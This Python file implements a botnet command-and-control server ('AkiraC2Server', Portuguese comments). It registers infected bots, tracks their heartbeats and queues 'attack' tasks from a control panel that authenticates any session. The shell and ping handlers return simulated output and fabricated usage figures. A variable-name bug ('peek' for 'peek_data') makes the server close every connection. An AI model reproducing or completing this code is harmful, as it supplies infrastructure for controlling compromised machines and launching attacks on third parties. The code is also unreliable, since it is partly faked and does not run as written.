#!/usr/bin/env python3
import socket
import json
import threading
import time
import sqlite3
from datetime import datetime
import logging

class AkiraC2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.bots = {}
        self.tasks = {}
        self.results = {}
        self.db_conn = sqlite3.connect('c2_database.db', check_same_thread=False)
        self.setup_database()
        self.setup_logging()
        
    def setup_database(self):
        cursor = self.db_conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bots (
                id TEXT PRIMARY KEY,
                ip TEXT,
                os TEXT,
                first_seen TEXT,
                last_seen TEXT,
                status TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                bot_id TEXT,
                task_type TEXT,
                parameters TEXT,
                status TEXT,
                created_at TEXT,
                completed_at TEXT
            )
        ''')
        self.db_conn.commit()
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('c2_server.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger()
        
    def handle_panel_connection(self, conn, addr):
        """Lida com conexões do painel"""
        try:
            while True:
                data = conn.recv(4096).decode().strip()
                if not data:
                    break
                    
                try:
                    message = json.loads(data)
                    response = self.process_panel_command(message)
                    conn.send(json.dumps(response).encode())
                except json.JSONDecodeError:
                    conn.send(json.dumps({"status": "error", "message": "Invalid JSON"}).encode())
                    
        except Exception as e:
            self.logger.error(f"Panel connection error: {e}")
        finally:
            conn.close()
            
    def handle_bot_connection(self, conn, addr):
        """Lida com conexões dos bots"""
        bot_id = None
        try:
            while True:
                data = conn.recv(4096).decode().strip()
                if not data:
                    break
                    
                message = json.loads(data)
                bot_id = message.get("bot_id")
                
                if message.get("type") == "register":
                    response = self.register_bot(bot_id, addr[0], message.get("os", "Unknown"))
                    conn.send(json.dumps(response).encode())
                    
                elif message.get("type") == "heartbeat":
                    self.update_bot_heartbeat(bot_id)
                    # Verifica se há tarefas pendentes
                    task = self.get_pending_task(bot_id)
                    if task:
                        conn.send(json.dumps(task).encode())
                    else:
                        conn.send(json.dumps({"status": "no_task"}).encode())
                        
                elif message.get("type") == "task_result":
                    self.store_task_result(bot_id, message)
                    conn.send(json.dumps({"status": "result_received"}).encode())
                    
        except Exception as e:
            self.logger.error(f"Bot connection error: {e}")
        finally:
            if bot_id:
                self.mark_bot_offline(bot_id)
            conn.close()
            
    def register_bot(self, bot_id, ip, os_info):
        """Registra um novo bot"""
        current_time = datetime.now().isoformat()
        
        cursor = self.db_conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO bots (id, ip, os, first_seen, last_seen, status)
            VALUES (?, ?, ?, COALESCE((SELECT first_seen FROM bots WHERE id = ?), ?), ?, ?)
        ''', (bot_id, ip, os_info, bot_id, current_time, current_time, "online"))
        
        self.db_conn.commit()
        
        self.bots[bot_id] = {
            "ip": ip,
            "os": os_info,
            "last_seen": current_time,
            "online": True
        }
        
        self.logger.info(f"Bot registered: {bot_id} from {ip}")
        return {"status": "registered", "bot_id": bot_id}
        
    def update_bot_heartbeat(self, bot_id):
        """Atualiza heartbeat do bot"""
        current_time = datetime.now().isoformat()
        
        cursor = self.db_conn.cursor()
        cursor.execute('''
            UPDATE bots SET last_seen = ?, status = ? WHERE id = ?
        ''', (current_time, "online", bot_id))
        
        self.db_conn.commit()
        
        if bot_id in self.bots:
            self.bots[bot_id]["last_seen"] = current_time
            self.bots[bot_id]["online"] = True
            
    def mark_bot_offline(self, bot_id):
        """Marca bot como offline"""
        cursor = self.db_conn.cursor()
        cursor.execute('UPDATE bots SET status = ? WHERE id = ?', ("offline", bot_id))
        self.db_conn.commit()
        
        if bot_id in self.bots:
            self.bots[bot_id]["online"] = False
            
    def get_pending_task(self, bot_id):
        """Obtém tarefa pendente para o bot"""
        cursor = self.db_conn.cursor()
        cursor.execute('''
            SELECT id, task_type, parameters FROM tasks 
            WHERE bot_id = ? AND status = 'pending' 
            ORDER BY created_at ASC LIMIT 1
        ''', (bot_id,))
        
        task = cursor.fetchone()
        if task:
            task_id, task_type, params = task
            return {
                "status": "task",
                "task_id": task_id,
                "type": task_type,
                "parameters": json.loads(params)
            }
        return None
        
    def store_task_result(self, bot_id, message):
        """Armazena resultado da tarefa"""
        cursor = self.db_conn.cursor()
        cursor.execute('''
            UPDATE tasks SET status = 'completed', completed_at = ? 
            WHERE id = ? AND bot_id = ?
        ''', (datetime.now().isoformat(), message.get("task_id"), bot_id))
        self.db_conn.commit()
        
    def process_panel_command(self, message):
        """Processa comandos do painel"""
        cmd_type = message.get("type")
        session_id = message.get("session_id")
        target_bot = message.get("target")
        
        self.logger.info(f"Panel command: {cmd_type} from {session_id}")
        
        if cmd_type == "panel_auth":
            return {"status": "authenticated", "session_id": session_id}
            
        elif cmd_type == "get_bots":
            return {"status": "success", "bots": self.bots}
            
        elif cmd_type == "ping":
            if target_bot:
                # Ping específico - simulado
                if target_bot in self.bots:
                    return {
                        "status": "success", 
                        "pings": {
                            target_bot: {
                                "ping": "10ms",
                                "os": self.bots[target_bot]["os"],
                                "cpu_usage": "15%",
                                "ram_usage": "45%",
                                "uptime": "2h 30m"
                            }
                        }
                    }
                else:
                    return {"status": "error", "message": "Bot not found"}
            else:
                # Ping todos os bots
                pings = {}
                for bot_id, bot_info in self.bots.items():
                    if bot_info["online"]:
                        pings[bot_id] = {
                            "ping": f"{5 + (hash(bot_id) % 20)}ms",
                            "os": bot_info["os"],
                            "cpu_usage": f"{10 + (hash(bot_id) % 40)}%",
                            "ram_usage": f"{30 + (hash(bot_id) % 50)}%",
                            "uptime": f"{(hash(bot_id) % 24)}h {(hash(bot_id) % 60)}m"
                        }
                return {"status": "success", "pings": pings}
                
        elif cmd_type == "shell":
            # Simula execução de comando shell
            command = message.get("command", "")
            if command.startswith("cd "):
                return {"status": "success", "output": ""}
            else:
                return {
                    "status": "success", 
                    "output": f"root@bot{target_bot}:~# {command}\nSimulated output for: {command}"
                }
                
        elif cmd_type == "attack":
            # Agenda ataque
            attack_type = message.get("attack_type")
            params = message.get("params", {})
            target_bot = message.get("target_bot")
            
            cursor = self.db_conn.cursor()
            cursor.execute('''
                INSERT INTO tasks (bot_id, task_type, parameters, status, created_at)
                VALUES (?, ?, ?, ?, ?)
            ''', (target_bot or "all", attack_type, json.dumps(params), "pending", datetime.now().isoformat()))
            
            self.db_conn.commit()
            
            return {"status": "success", "message": f"Attack {attack_type} scheduled"}
            
        elif cmd_type == "delete_bot":
            if target_bot in self.bots:
                del self.bots[target_bot]
                cursor = self.db_conn.cursor()
                cursor.execute('DELETE FROM bots WHERE id = ?', (target_bot,))
                self.db_conn.commit()
                return {"status": "success", "message": f"Bot {target_bot} deleted"}
            else:
                return {"status": "error", "message": "Bot not found"}
                
        return {"status": "error", "message": "Unknown command"}
        
    def start_server(self):
        """Inicia servidor C2"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(5)
        
        self.logger.info(f"C2 Server started on {self.host}:{self.port}")
        
        try:
            while True:
                conn, addr = server_socket.accept()
                
                # Determina se é painel ou bot pela primeira mensagem
                try:
                    peek_data = conn.recv(1024, socket.MSG_PEEK)
                    message = json.loads(peek.decode().strip())
                    
                    if message.get("type") in ["panel_auth", "get_bots", "ping", "shell", "attack", "delete_bot"]:
                        threading.Thread(target=self.handle_panel_connection, args=(conn, addr)).start()
                    else:
                        threading.Thread(target=self.handle_bot_connection, args=(conn, addr)).start()
                        
                except:
                    conn.close()
                    
        except KeyboardInterrupt:
            self.logger.info("Shutting down C2 server...")
        finally:
            server_socket.close()
            self.db_conn.close()

if __name__ == "__main__":
    c2_server = AkiraC2Server()
    c2_server.start_server()
